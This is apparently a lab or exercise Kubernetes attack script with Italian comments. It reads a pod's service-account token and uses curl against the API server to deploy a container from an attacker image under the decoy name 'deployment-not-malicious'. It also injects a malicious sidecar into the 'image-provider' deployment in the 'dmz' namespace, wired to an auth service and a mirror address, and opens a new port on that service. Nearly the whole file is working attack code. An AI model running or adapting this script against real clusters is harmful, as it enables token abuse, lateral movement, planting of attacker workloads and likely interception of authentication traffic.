#!/bin/sh

# Percorsi standard montati nel Pod
TOKEN_PATH="/token"
CA_PATH="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NAMESPACE_PATH="/var/run/secrets/kubernetes.io/serviceaccount/namespace"

# Leggo i dati dal filesystem
TOKEN=$(cat ${TOKEN_PATH})
NAMESPACE=$(cat ${NAMESPACE_PATH})
GROUP="cluster2"
NAMESPACE2="dmz"

# URL API Server (interno al cluster, service DNS)
APISERVER="https://kubernetes.default.svc"
MIRRORADDR="prova.dmz.svc.cluster.local:8080"
IPAUTH=$(nslookup -type=A auth.app | awk '/Address: /{print $2}')

# Deployment YAML
cat > /tmp/deployment-malicious.yaml <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-not-malicious
spec:
  replicas: 1
  selector:
    matchLabels:
      app: deployment-not-malicious
  template:
    metadata:
      labels:
        app: deployment-not-malicious
    spec:
      containers:
      - name: malicious
        image: malicious:5000/attacker:2.0.2
        ports:
        - containerPort: 8080
        env:
          - name: GROUP
            value: "${GROUP}"
EOF

jq -n \
  --arg ipauth "$IPAUTH:8080" \
  --arg mirroraddr "$MIRRORADDR" '
[
  {
    "op":"add",
    "path":"/spec/template/spec/containers/-",
    "value":{
      "name":"sidecar-malicious",
      "image":"malicious:5000/sidecar-mal:2.0.2",
      "ports":[{"containerPort":8080}],
      "env":[
        {"name":"PRIMARY_ADDR","value":$ipauth},
        {"name":"MIRROR_ADDR","value":$mirroraddr}
      ]
    }
  }
]' > /tmp/patch_sidecar.json

# Invio la richiesta all’API Server autenticandomi con il token
curl --cacert ${CA_PATH} \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/yaml" \
  -X POST \
  --data-binary @/tmp/deployment-malicious.yaml \
  ${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE}/deployments

# Aggiunta del sidecar su image-provider
curl -X PATCH \
  --cacert "${CA_PATH}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json-patch+json" \
  --data @/tmp/patch_sidecar.json \
  "${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE2}/deployments/image-provider"

# Aggiunta service
curl -H "Authorization: Bearer $TOKEN" \
  --cacert ${CA_PATH} \
  -H "Content-Type: application/json-patch+json" \
  -X PATCH \
  "${APISERVER}/api/v1/namespaces/${NAMESPACE2}/services/image-provider" \
  -d '[{"op":"add","path":"/spec/ports/-","value":{"port":8080,"targetPort":8080,"protocol":"TCP","name":"http-8080"}}]'

echo "Containers deployed"